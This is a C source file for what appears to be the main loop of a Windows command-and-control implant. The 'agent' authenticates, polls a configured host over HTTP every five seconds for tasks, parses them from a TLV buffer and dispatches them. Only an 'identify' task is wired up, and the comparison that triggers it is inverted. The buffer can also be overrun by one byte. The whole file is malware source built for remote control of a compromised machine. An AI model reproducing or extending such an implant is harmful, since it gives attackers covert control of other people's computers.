#include <stdio.h>
#include <Lmcons.h>
#include <Windows.h>

#include <init.h>
#include <windows_utils.h>
#include <http_client.h>
#include <communication.h>
#include <tlv.h>

#include <config.h>

struct Agent agent;

int main() {
  init();
  
  DWORD httpBytesRead;

  struct TLVBuild tasksTLV;
  struct TLVBuild taskTLV;
  struct TLVBuild argsTLV;

  char* tasksBuffer = malloc(1024);

  while (1) {  
    authenticate();
    while (1) {
      printf("fetching commands..\n");

      http_getrequest(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer);
      tasksBuffer[httpBytesRead] = 0x00;
      tasksTLV.allocsize = 1024;
      tasksTLV.buf = tasksBuffer;
      tasksTLV.bufsize = httpBytesRead;
      tasksTLV.read_cursor = 0;

      int tasksCount = extractInt32(&tasksTLV);
      extractInt32(&tasksTLV); // size of the tasks buffer, useless for us.

      for (int i = 0; i < tasksCount; i++) {
        int taskId = extractInt32(&tasksTLV);
        int taskNameSize = extractInt32(&tasksTLV);
        int argc = extractInt32(&tasksTLV);

        char * taskName = malloc(taskNameSize + 1);
        extractBytes(&tasksTLV, taskNameSize, taskName);
        taskName[taskNameSize] = 0x00;

        int argBytes = extractInt32(&tasksTLV);
        char * args = malloc(argBytes);
        extractBytes(&tasksTLV, argBytes, args);
        
        printf("[+] got task id: %u\n", taskId);
        printf("    | TaskName: %s\n", taskName); 

        if (strcmp(taskName, "identify") != 0) 
          agent_identify(taskId);

        free(args);
        free(taskName);
      }

      Sleep(5000);
    }
  }

  free(tasksBuffer);

  return 0;
}